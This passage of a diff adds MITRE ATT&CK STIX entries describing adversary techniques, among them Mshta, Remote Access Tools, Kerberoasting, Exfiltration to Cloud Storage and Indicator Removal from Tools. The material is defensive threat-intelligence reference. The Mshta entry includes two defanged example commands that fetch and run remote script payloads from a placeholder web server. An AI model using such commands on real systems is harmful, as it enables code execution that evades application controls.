Rules)\n\nIn some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives. ",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "collection"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.2.0",
+   "x_mitre_contributors": [
+    "Microsoft Security",
+    "Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC)",
+    "Liran Ravich, CardinalOps",
+    "Arun Seelagan, CISA"
+   ],
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": true,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "Linux",
+    "macOS",
+    "Office Suite",
+    "Windows"
+   ],
+   "x_mitre_version": "1.4"
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
+   "created": "2020-01-23T19:32:49.557Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1218/005",
+     "external_id": "T1218.005"
+    },
+    {
+     "source_name": "FireEye Attacks Leveraging HTA",
+     "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",
+     "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html"
+    },
+    {
+     "source_name": "FireEye FIN7 April 2017",
+     "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+     "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html"
+    },
+    {
+     "source_name": "Airbus Security Kovter Analysis",
+     "description": "Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
+     "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/"
+    },
+    {
+     "source_name": "Cylance Dust Storm",
+     "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.",
+     "url": "https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf"
+    },
+    {
+     "source_name": "LOLBAS Mshta",
+     "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.",
+     "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+    },
+    {
+     "source_name": "Red Canary HTA Abuse Part Deux",
+     "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",
+     "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/"
+    },
+    {
+     "source_name": "MSDN HTML Applications",
+     "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",
+     "url": "https://msdn.microsoft.com/library/ms536471.aspx"
+    },
+    {
+     "source_name": "Wikipedia HTML Application",
+     "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
+     "url": "https://en.wikipedia.org/wiki/HTML_Application"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2026-05-12T15:12:00.676Z",
+   "name": "Mshta",
+   "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "stealth"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.3.0",
+   "x_mitre_contributors": [
+    "@ionstorm",
+    "Ricardo Dias",
+    "Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank"
+   ],
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": true,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "Windows"
+   ],
+   "x_mitre_version": "3.0"
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
+   "created": "2018-04-18T17:59:24.739Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1219",
+     "external_id": "T1219"
+    },
+    {
+     "source_name": "CrowdStrike 2015 Global Threat Report",
+     "description": "CrowdStrike Intelligence. (2016). 2015 Global Threat Report. Retrieved April 11, 2018.",
+     "url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf"
+    },
+    {
+     "source_name": "CrySyS Blog TeamSpy",
+     "description": "CrySyS Lab. (2013, March 20). TeamSpy – Obshie manevri. Ispolzovat’ tolko s razreshenija S-a. Retrieved April 11, 2018.",
+     "url": "https://blog.crysys.hu/2013/03/teamspy/"
+    },
+    {
+     "source_name": "Google Chrome Remote Desktop",
+     "description": "Google. (n.d.). Retrieved March 14, 2024.",
+     "url": "https://support.google.com/chrome/answer/1649523"
+    },
+    {
+     "source_name": "Chrome Remote Desktop",
+     "description": "Huntress. (n.d.). Retrieved March 14, 2024.",
+     "url": "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
+    },
+    {
+     "source_name": "Symantec Living off the Land",
+     "description": "Wueest, C., Anand, H. (2017, July). Living off the land and fileless attack techniques. Retrieved April 10, 2018.",
+     "url": "https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2026-05-12T15:12:00.628Z",
+   "name": "Remote Access Tools",
+   "description": "An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nRemote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.\n\nInstallation of many remote access tools may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "command-and-control"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.3.0",
+   "x_mitre_contributors": [
+    "Matt Kelly, @breakersall",
+    "Zachary Stanford, @svch0st",
+    "Dray Agha, @Purp1eW0lf, Huntress Labs"
+   ],
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": false,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "Linux",
+    "macOS",
+    "Windows"
+   ],
+   "x_mitre_version": "3.0"
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee",
+   "created": "2020-02-11T18:43:38.588Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1558/003",
+     "external_id": "T1558.003"
+    },
+    {
+     "source_name": "Microsoft Detecting Kerberoasting Feb 2018",
+     "description": "Bani, M. (2018, February 23). Detecting Kerberoasting activity using Azure Security Center. Retrieved March 23, 2018.",
+     "url": "https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/"
+    },
+    {
+     "source_name": "Empire InvokeKerberoast Oct 2016",
+     "description": "EmpireProject. (2016, October 31). Invoke-Kerberoast.ps1. Retrieved March 22, 2018.",
+     "url": "https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1"
+    },
+    {
+     "source_name": "SANS Attacking Kerberos Nov 2014",
+     "description": "Medin, T. (2014, November). Attacking Kerberos - Kicking the Guard Dog of Hades. Retrieved March 22, 2018.",
+     "url": "https://redsiege.com/kerberoast-slides"
+    },
+    {
+     "source_name": "AdSecurity Cracking Kerberos Dec 2015",
+     "description": "Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain. Retrieved March 22, 2018.",
+     "url": "https://adsecurity.org/?p=2293"
+    },
+    {
+     "source_name": "Microsoft SetSPN",
+     "description": "Microsoft. (2010, April 13). Service Principal Names (SPNs) SetSPN Syntax (Setspn.exe). Retrieved March 22, 2018.",
+     "url": "https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx"
+    },
+    {
+     "source_name": "Microsoft SPN",
+     "description": "Microsoft. (n.d.). Service Principal Names. Retrieved March 22, 2018.",
+     "url": "https://msdn.microsoft.com/library/ms677949.aspx"
+    },
+    {
+     "source_name": "Harmj0y Kerberoast Nov 2016",
+     "description": "Schroeder, W. (2016, November 1). Kerberoasting Without Mimikatz. Retrieved September 23, 2024.",
+     "url": "https://blog.harmj0y.net/powershell/kerberoasting-without-mimikatz/"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2025-10-24T17:49:36.038Z",
+   "name": "Kerberoasting",
+   "description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "credential-access"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.2.0",
+   "x_mitre_contributors": [
+    "Praetorian"
+   ],
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": true,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "Windows"
+   ],
+   "x_mitre_version": "1.3"
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b",
+   "created": "2020-03-09T15:04:32.767Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1567/002",
+     "external_id": "T1567.002"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2026-05-12T15:12:00.713Z",
+   "name": "Exfiltration to Cloud Storage",
+   "description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "exfiltration"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.3.0",
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": true,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "ESXi",
+    "Linux",
+    "macOS",
+    "Windows"
+   ],
+   "x_mitre_version": "1.3"
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
+   "created": "2017-05-31T21:30:54.176Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": true,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1066",
+     "external_id": "T1066"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2026-04-14T22:53:15.802Z",
+   "name": "Indicator Removal from Tools",
+   "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "stealth"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.2.0",
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": false,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "Linux",
+    "macOS",
+    "Windows"
+   ],
+   "x_mitre_version": "1.1"
+  },
+  {
+   "type": "attack-pattern",
+   "spec_version": "2.1",
+   "id": "attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92",
+   "created": "2020-03-19T21:27:32.820Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "external_references": [
+    {
+     "source_name": "mitre-attack",
+     "url": "https://attack.mitre.org/techniques/T1027/005",
+     "external_id": "T1027.005"
+    }
+   ],
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2026-05-12T15:12:00.707Z",
+   "name": "Indicator Removal from Tools",
+   "description": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
+   "kill_chain_phases": [
+    {
+     "kill_chain_name": "mitre-attack",
+     "phase_name": "stealth"
+    }
+   ],
+   "x_mitre_attack_spec_version": "3.3.0",
+   "x_mitre_deprecated": false,
+   "x_mitre_domains": [
+    "enterprise-attack"
+   ],
+   "x_mitre_is_subtechnique": true,
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_platforms": [
+    "Linux",
+    "macOS",
+    "Windows"
+   ],
+   "x_mitre_version": "2.0"
+  },
+  {
+   "type": "relationship",
+   "spec_version": "2.1",
+   "id": "relationship--cb4015bf-e7a4-4b26-8816-1f7a996adf4f",
+   "created": "2020-03-20T15:22:53.973Z",
+   "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "revoked": false,
+   "object_marking_refs": [
+    "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+   ],
+   "modified": "2026-04-29T14:23:06.203Z",
+   "relationship_type": "revoked-by",
+   "source_ref": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
+   "target_ref": "attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92",
+   "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+   "x_mitre_deprecated": false,
+   "x_mitre_attack_spec_version": "3.3.0"
+  }
+ ]
+}
